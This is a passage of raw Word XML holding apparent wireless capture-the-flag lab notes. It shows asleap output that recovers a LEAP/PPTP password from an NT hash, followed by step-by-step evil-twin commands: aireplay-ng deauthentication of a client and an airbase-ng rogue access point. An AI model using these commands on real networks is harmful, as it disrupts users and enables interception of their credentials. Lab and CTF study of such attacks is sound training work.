        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cracklib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-words</w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F19F55" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D742E91" w14:textId="37E34037" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.2 – actively recover LEAP/PPTP passwords. &lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>jwright@hasborg.com</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt; hash bytes: b1cd NT hash: a4f49c406510bdcab6824ee7c30fd852 password: password </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EA66BF" w14:textId="77844EB7" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CCAF94" w14:textId="46B25906" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Evil Twin</w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> using airbase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FA0FE1" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E3FDF74" w14:textId="4D6C0E32" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to see if client associated with AP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A7D1D0" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FFA46B7" w14:textId="3A451B63" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-regex WCTF* </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730A9FB1" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EC11227" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Boost our rogue AP to max power</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE21CAF" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50736075" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>txpower</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E141253" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DB551F2" w14:textId="1B935B65" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> up </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> of client from legit AP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001565F8" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F25EFE1" w14:textId="2B29954E" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 –a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_Mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="136C2385" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="369B7441" w14:textId="64D6FD23" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> up rogue AP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08386F5F" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33E0192F" w14:textId="6B6098DC" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airbase</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_Mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> “WCTF15” –c </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>11 wlan1</w:t>
      </w:r>
    </w:p>
